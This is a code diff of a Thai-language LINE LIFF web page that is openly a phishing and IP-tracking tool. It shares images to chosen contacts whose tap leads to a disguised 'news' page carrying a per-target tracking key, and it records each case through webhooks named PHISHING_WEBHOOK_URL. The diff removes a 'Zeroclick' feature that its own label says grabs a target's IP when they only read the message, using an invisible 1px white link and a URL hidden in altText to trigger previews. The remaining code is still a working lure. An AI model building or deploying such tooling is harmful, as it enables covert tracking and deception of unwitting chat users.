@@ -719,18 +719,6 @@
                 <div class="tips">
                     <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจและมีขนาดไม่ใหญ่เกินไป เพื่อให้โหลดได้อย่างรวดเร็ว</p>
                 </div>
-
-                <!-- เพิ่มตัวเลือกเปิด/ปิดลิงก์ตัวอย่าง -->
-                <div style="margin-top: 20px; display: flex; align-items: center;">
-                    <input type="checkbox" id="enablePreviewLink" style="margin-right: 10px;">
-                    <label for="enablePreviewLink" style="margin-bottom: 0; font-size: 14px; color: #666;">
-                        <i class="fas fa-link"></i> เปิดใช้งานลิงก์ตัวอย่างอัตโนมัติ (Zeroclick)
-                    </label>
-                </div>
-                <div style="margin-top: 5px; font-size: 12px; color: #888; padding-left: 25px;">
-                    ช่วยให้สามารถรับ IP เมื่อเป้าหมายเพียงแค่อ่านข้อความ
-                </div>
-                
             </div>
         </div>
         
@@ -758,8 +746,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwXjtfNGvBO7j9dCpPP2BxXWzstsKndr53kWlCRqorgtFNSUypeWRe5a3E53sQHPNk/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwXjtfNGvBO7j9dCpPP2BxXWzstsKndr53kWlCRqorgtFNSUypeWRe5a3E53sQHPNk/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1214,7 +1202,7 @@
         }
         
         // บันทึกข้อมูล Tracking Key และ Case Name
-        async function saveTrackingCaseMapping(trackKey, caseName, zeroclickEnabled = false) {
+        async function saveTrackingCaseMapping(trackKey, caseName) {
             if (!isLiffInitialized || !userId) {
                 console.error('LIFF ยังไม่เริ่มต้นหรือไม่มี userId');
                 return false;
@@ -1226,7 +1214,6 @@
                 console.log('ผู้สร้าง ID:', userId);
                 console.log('ชื่อผู้สร้าง:', displayName);
                 console.log('รูปภาพ URL:', imageUrl);
-                console.log('เปิดใช้งานลิงก์ตัวอย่าง:', zeroclickEnabled);
                 
                 // แสดงสถานะกำลังบันทึก
                 showStatus('กำลังบันทึกข้อมูล...', true);
@@ -1242,7 +1229,6 @@
                     creatorId: userId,
                     creatorName: displayName,
                     imageUrl: imageUrl,
-                    zeroclickEnabled: zeroclickEnabled, // เพิ่มค่าตัวแปรใหม่
                     requestId: requestId,
                     timestamp: new Date().toISOString()
                 };
@@ -1499,11 +1485,8 @@
                 // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
-                // 4. ตรวจสอบการเปิดใช้งานลิงก์ตัวอย่าง (Zeroclick)
-                const enablePreviewLink = document.getElementById('enablePreviewLink').checked;
-                
-                // 5. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
-                let message = {
+                // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
+                const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`,
                     contents: {
@@ -1521,65 +1504,19 @@
                         }
                     }
                 };
-                
-                // 6. เพิ่มลิงก์ตัวอย่าง (Zeroclick) หากเปิดใช้งาน
-                if (enablePreviewLink) {
-                    // สร้าง URL สำหรับ Zeroclick - เพิ่มพารามิเตอร์ source=zeroclick
-                    const zeroclickUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=zeroclick`;
-                    
-                    // สร้าง flex message ที่มีทั้งรูปภาพและลิงก์ซ่อนไว้สำหรับ Zeroclick
-                    message = {
-                        type: 'flex',
-                        altText: `รูปภาพใหม่ ${zeroclickUrl}`, // ฝังลิงก์ใน altText เพื่อให้ LINE พยายามโหลดตัวอย่าง
-                        contents: {
-                            type: 'bubble',
-                            hero: {
-                                type: 'image',
-                                url: imageUrl,
-                                size: 'full',
-                                aspectRatio: '1:1',
-                                aspectMode: 'cover',
-                                action: {
-                                    type: 'uri',
-                                    uri: clickTrackUrl
-                                }
-                            },
-                            // เพิ่มข้อความและปุ่มที่มองไม่เห็น แต่มี URL สำหรับ Zeroclick
-                            footer: {
-                                type: 'box',
-                                layout: 'vertical',
-                                contents: [
-                                    {
-                                        type: 'text',
-                                        text: ' ', // เว้นว่างเพื่อไม่ให้แสดงข้อความ
-                                        color: '#FFFFFF', // ใช้สีเดียวกับพื้นหลังเพื่อซ่อน
-                                        action: {
-                                            type: 'uri',
-                                            uri: zeroclickUrl
-                                        },
-                                        size: '1px' // ขนาดเล็กมากเพื่อซ่อน
-                                    }
-                                ],
-                                paddingAll: '0px',
-                                height: '1px'
-                            }
-                        }
-                    };
-                }
 
                 console.log("กำลังแชร์ Flex Message:", JSON.stringify(message, null, 2));
 
-                // 7. แชร์ผ่าน LINE ShareTargetPicker
+                // 5. แชร์ผ่าน LINE ShareTargetPicker
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     const result = await liff.shareTargetPicker([message]);
                     
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
                         
-                        // 8. บันทึกข้อมูล Tracking หลังแชร์สำเร็จ
+                        // 6. บันทึกข้อมูล Tracking หลังแชร์สำเร็จ
                         try {
-                            // เพิ่มค่าตัวแปร zeroclickEnabled ในการบันทึก
-                            const saved = await saveTrackingCaseMapping(trackKey, caseName, enablePreviewLink);
+                            const saved = await saveTrackingCaseMapping(trackKey, caseName);
                             if (saved) {
                                 console.log('บันทึก Tracking Key Mapping สำเร็จ');
                             }
@@ -1587,7 +1524,7 @@
                             console.error('เกิดข้อผิดพลาดในการบันทึก Tracking Key:', saveError);
                         }
 
-                        // 9. รีเซ็ตแบบฟอร์ม
+                        // 7. รีเซ็ตแบบฟอร์ม
                         resetForm();
                     } else {
                         showStatus('การแชร์ถูกยกเลิก', false);
@@ -1627,7 +1564,6 @@
             document.getElementById('imagePreview').style.display = 'none';
             document.getElementById('uploadPrompt').style.display = 'block';
             document.getElementById('shareBtn').disabled = true;
-            document.getElementById('enablePreviewLink').checked = false; // รีเซ็ตการตั้งค่าลิงก์ตัวอย่าง
             
             selectedImage = null;
             trackingKey = "";
